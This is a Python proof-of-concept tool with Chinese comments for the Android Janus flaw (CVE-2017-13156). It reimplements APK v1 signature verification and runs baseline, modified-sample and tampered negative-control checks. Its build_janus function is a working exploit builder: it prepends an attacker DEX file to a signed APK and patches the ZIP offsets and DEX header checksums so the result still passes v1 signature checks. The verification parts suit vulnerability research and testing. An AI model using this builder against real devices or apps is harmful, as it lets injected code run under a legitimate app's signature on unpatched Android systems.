#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
janus_poc.py — CVE-2017-13156 (Janus) 复现与验证工具（R1 / Android 5.1.1 语境）

做三件事：
  1) verify_v1()  —— 在 PC 上复刻 Android <=8 的 APK v1(JAR) 签名校验：
                     MANIFEST.MF 逐条目摘要 -> CERT.SF -> CERT.RSA(PKCS#7, openssl)
                     并额外报告「ZIP 结构之外的前置字节区」（v1 的盲区）
  2) build_janus() —— 按 V-E-O/PoC 的算法构造 Janus 文件：
                     [ 攻击者 DEX ] + [ 原始已签名 APK，修补 EOCD/CD 偏移 ]
                     并把 DEX 头的 file_size / SHA-1 signature / adler32 改成覆盖整个合并文件
  3) 全流程自检：原厂基线 / 真实魔改样本 / 人为篡改(阴性对照) / 自制 PoC

用法:
  python janus_poc.py                 # 跑全部
  python janus_poc.py --dex <d> --apk <a> --out <o>   # 只构造
"""
import base64
import hashlib
import io
import os
import re
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib

WORK = os.path.dirname(os.path.abspath(__file__))
EOCD_SIG = b"\x50\x4b\x05\x06"
CD_SIG = b"\x50\x4b\x01\x02"
LH_SIG = b"\x50\x4b\x03\x04"
DEX_MAGIC = b"dex\n"


# ---------------------------------------------------------------- DEX header
def dex_header(d):
    u32 = lambda o: struct.unpack("<L", d[o:o + 4])[0]
    return {
        "magic": d[:8],
        "checksum": u32(8),
        "signature": d[12:32].hex(),
        "file_size": u32(32),
        "header_size": u32(36),
        "endian_tag": hex(u32(40)),
        "map_off": u32(52),
        "string_ids_size": u32(56),
        "type_ids_size": u32(64),
        "proto_ids_size": u32(72),
        "field_ids_size": u32(80),
        "method_ids_size": u32(88),
        "class_defs_size": u32(96),
        "data_size": u32(104),
        "actual_len": len(d),
    }


def dex_selfcheck(d):
    """校验 DEX 头的 adler32 / SHA-1 是否与自身内容一致。"""
    h = dex_header(d)
    ok_sig = hashlib.sha1(d[32:]).digest() == d[12:32]
    ok_sum = (zlib.adler32(d[12:]) & 0xFFFFFFFF) == h["checksum"]
    return ok_sig, ok_sum


# ------------------------------------------------------- ZIP / Janus 结构解析
def zip_layout(path):
    d = open(path, "rb").read()
    i = d.rfind(EOCD_SIG)
    if i < 0:
        return None
    cd_off = struct.unpack("<L", d[i + 16:i + 20])[0]
    first_lh = d.find(LH_SIG)
    # 找中央目录里第一个条目的 local header offset
    min_off = None
    zf = zipfile.ZipFile(io.BytesIO(d))
    min_off = min(zi.header_offset for zi in zf.infolist())
    return {
        "size": len(d),
        "head8": d[:8],
        "eocd_off": i,
        "cd_off": cd_off,
        "first_pk0304": first_lh,
        "min_entry_offset": min_off,
        "prefix_len": first_lh if first_lh > 0 else 0,
        "dex_magics_at": [m.start() for m in re.finditer(re.escape(DEX_MAGIC), d)][:8],
        "data": d,
    }


# ----------------------------------------------------------- JAR (v1) 校验
def _parse_manifest(b):
    """MANIFEST.MF / CERT.SF -> [(name, {attr_lower: value})]，含续行处理。"""
    text = b.decode("utf-8", "replace")
    sections, cur = [], {}
    for line in text.splitlines():
        if line == "":
            if cur:
                sections.append(cur)
            cur = {}
            continue
        if line[:1] == " " and cur:  # 续行
            k = list(cur)[-1]
            cur[k] += line[1:]
            continue
        if ":" in line:
            k, _, v = line.partition(":")
            cur[k.strip().lower()] = v.strip()
    if cur:
        sections.append(cur)
    out = []
    for s in sections:
        out.append((s.get("name"), s))
    return out


def algo_of(key):
    k = key.lower()
    if k.startswith("sha-256"):
        return "sha256"
    if k.startswith("sha1") or k.startswith("sha-1"):
        return "sha1"
    if k.startswith("md5"):
        return "md5"
    return None


def _digest(algo, data):
    return base64.b64encode(hashlib.new(algo, data).digest()).decode()


def verify_v1(path, label="", tmpdir=None):
    """复刻 Android v1 校验，返回结构化结果。"""
    res = {"file": os.path.basename(path), "label": label, "errors": [], "checks": []}
    d = open(path, "rb").read()
    lay = zip_layout(path)
    res["layout"] = {k: v for k, v in lay.items() if k != "data"}
    res["prefix_len"] = lay["prefix_len"]
    res["head8"] = lay["head8"]
    res["is_janus_shape"] = lay["prefix_len"] > 0 and d[:4] == DEX_MAGIC

    zf = zipfile.ZipFile(io.BytesIO(d))
    names = zf.namelist()

    # --- META-INF 存在性
    for need in ("META-INF/MANIFEST.MF", "META-INF/CERT.SF", "META-INF/CERT.RSA"):
        if need not in names:
            res["errors"].append("缺少 " + need)
    if res["errors"]:
        res["verdict"] = "FAIL"
        return res

    man_raw = zf.read("META-INF/MANIFEST.MF")
    sf_raw = zf.read("META-INF/CERT.SF")
    rsa_raw = zf.read("META-INF/CERT.RSA")
    man = _parse_manifest(man_raw)
    sf = _parse_manifest(sf_raw)

    # --- ① MANIFEST.MF 逐条目摘要 vs 实际条目内容
    algo = "sha256"
    ok = bad = man_only = 0
    detail = []
    for name, sect in man:
        if name is None:
            continue
        key = None
        for cand in ("sha-256-digest", "sha256-digest", "sha1-digest", "sha-1-digest"):
            if cand in sect:
                key = cand
                break
        if key is None:
            continue
        a = algo_of(key)
        if name not in names:
            # Android 的 JarVerifier 只遍历 ZIP 里实际存在的条目，
            # manifest 里多出来的条目被忽略（构造器常借此删掉 ZIP 内的 classes.dex 省体积）
            man_only += 1
            detail.append(("MANIFEST-ONLY(无害)", name))
            continue
        got = _digest(a, zf.read(name))
        if got == sect[key]:
            ok += 1
        else:
            bad += 1
            detail.append(("DIGEST-MISMATCH", name))
    res["checks"].append(f"MANIFEST 条目摘要: ok={ok} bad={bad} manifest-only={man_only}")
    if detail:
        res["checks"].append("   异常条目: " + ", ".join(f"{s}:{n}" for s, n in detail[:8]))
    if bad:
        res["errors"].append(f"条目摘要不符 bad={bad}")

    # --- ①b ZIP 里有、manifest 里没有的条目（未签名条目）
    man_named = {n for n, _ in man if n}
    unsigned = [n for n in names
                if n not in man_named and not n.startswith("META-INF/")]
    if unsigned:
        res["checks"].append(f"未签名条目({len(unsigned)}): " + ", ".join(unsigned[:5]))

    # --- ② CERT.SF 的 Digest-Manifest vs MANIFEST.MF 原文
    sfmain = sf[0][1] if sf and sf[0][0] is None else {}
    dm_key = [k for k in sfmain if k.endswith("digest-manifest")]
    if dm_key:
        k = dm_key[0]
        a = algo_of(k)
        exp = sfmain[k]
        got = _digest(a, man_raw)
        res["checks"].append(f"CERT.SF {k}: {'OK' if got == exp else 'MISMATCH'}")
        if got != exp:
            res["errors"].append("CERT.SF digest-manifest 不符")

    # --- ③ PKCS#7 签名（CERT.RSA 对 CERT.SF）
    td = tmpdir or tempfile.mkdtemp()
    fp_rsa = os.path.join(td, "C.RSA")
    fp_sf = os.path.join(td, "C.SF")
    open(fp_rsa, "wb").write(rsa_raw)
    open(fp_sf, "wb").write(sf_raw)
    try:
        fp_out = os.path.join(td, "out.bin")
        r = subprocess.run(
            ["openssl", "smime", "-verify", "-binary", "-inform", "DER",
             "-in", fp_rsa, "-content", fp_sf, "-noverify", "-out", fp_out],
            capture_output=True, text=True, timeout=60)
        sig_ok = "Verification successful" in (r.stderr + r.stdout)
        res["checks"].append("CERT.RSA(PKCS#7) 验签: " + ("OK" if sig_ok else "FAILED"))
        if not sig_ok:
            res["errors"].append("PKCS#7 验签失败: " + (r.stderr or r.stdout).strip()[:200])
    except Exception as e:  # pragma: no cover
        res["checks"].append("CERT.RSA 验签: 无法执行(%s)" % e)

    # --- ④ 前缀盲区：签名覆盖到的字节范围
    if lay["prefix_len"] > 0:
        res["checks"].append(
            "签名盲区: offset 0..%d（%d 字节）不属于任何 ZIP 条目"
            % (lay["prefix_len"], lay["prefix_len"]))
    res["verdict"] = "PASS" if not res["errors"] else "FAIL"
    return res


# ---------------------------------------------------------------- Janus 构造
def build_janus(dex_bytes, apk_path, out_path):
    """[DEX] + [APK]，按 V-E-O PoC 修补 EOCD + 中央目录偏移，并修 DEX 头。"""
    with open(apk_path, "rb") as f:
        apk = bytearray(f.read())
    dex_size = len(dex_bytes)
    i = apk.rfind(EOCD_SIG)
    cd_start = struct.unpack("<L", apk[i + 16:i + 20])[0]
    # ① EOCD 的 central-directory offset
    apk[i + 16:i + 20] = struct.pack("<L", cd_start + dex_size)
    # ② 每个中央目录条目的 local-header offset
    pos = cd_start
    n_patched = 0
    while pos < i:
        off = struct.unpack("<L", apk[pos + 42:pos + 46])[0]
        apk[pos + 42:pos + 46] = struct.pack("<L", off + dex_size)
        n_patched += 1
        pos = apk.find(CD_SIG, pos + 46, i)
        if pos == -1:
            break
    out = bytearray(dex_bytes) + apk
    # ③ DEX 头自洽：file_size = 全文件；signature=SHA1(bytes[32:])；checksum=adler32(bytes[12:])
    out[32:36] = struct.pack("<L", len(out))
    out[12:32] = hashlib.sha1(bytes(out[32:])).digest()
    out[8:12] = struct.pack("<L", zlib.adler32(bytes(out[12:])) & 0xFFFFFFFF)
    with open(out_path, "wb") as f:
        f.write(out)
    return {"dex_size": dex_size, "patched_cd_entries": n_patched,
            "old_cd_off": cd_start, "new_cd_off": cd_start + dex_size,
            "out_size": len(out)}


def make_tampered(src_apk, out_path, entry="AndroidManifest.xml"):
    """阴性对照：复制一个 zip，把某条目的内容改 1 字节。"""
    zin = zipfile.ZipFile(src_apk)
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zo:
        for zi in zin.infolist():
            data = zin.read(zi.filename)
            if zi.filename == entry:
                data = bytes([data[0] ^ 0xFF]) + data[1:]
            zo.writestr(zi.filename, data)
    return out_path


# ---------------------------------------------------------------------- main
def show(res):
    print("=" * 78)
    print(f"[{res['label']}] {res['file']}")
    lay = res["layout"]
    print(f"  size={lay['size']:,}  head8={res['head8']!r}"
          f"  ZIP首次PK0304@{lay['first_pk0304']:,}  前置区={res['prefix_len']:,}B")
    print(f"  Janus 形态(前缀=DEX) ?  {res['is_janus_shape']}")
    for c in res["checks"]:
        print("   -", c)
    for e in res["errors"]:
        print("   !", e)
    print("  ⇒ 判定:", res["verdict"])
    return res


def main():
    argv = sys.argv[1:]
    if "--dex" in argv:
        dex = argv[argv.index("--dex") + 1]
        apk = argv[argv.index("--apk") + 1]
        out = argv[argv.index("--out") + 1]
        info = build_janus(open(dex, "rb").read(), apk, out)
        print("built:", out, info)
        return

    default_apk = os.path.join(os.path.dirname(WORK), "..", "diag", "pandora", "EchoService.apk")
    real_mod = os.path.join(os.path.dirname(WORK), "..", "new_EchoService1.8.82.apk")

    print("\n########## ① 原厂基线（未改动）##########")
    show(verify_v1(os.path.join(WORK, "EchoService.apk"), "BASELINE 原厂已签名"))

    print("\n########## ② 真实魔改样本 new_EchoService1.8.82.apk ##########")
    show(verify_v1(real_mod, "REAL-WORLD MOD"))

    print("\n########## ③ 阴性对照：篡改 1 字节后应 FAIL ##########")
    t = os.path.join(WORK, "tamper_test.apk")
    make_tampered(os.path.join(WORK, "EchoService.apk"), t)
    show(verify_v1(t, "NEGATIVE CONTROL"))

    print("\n########## ④ 自制 PoC ##########")
    print("（见 janus_poc_run.py 的输出）")


if __name__ == "__main__":
    main()
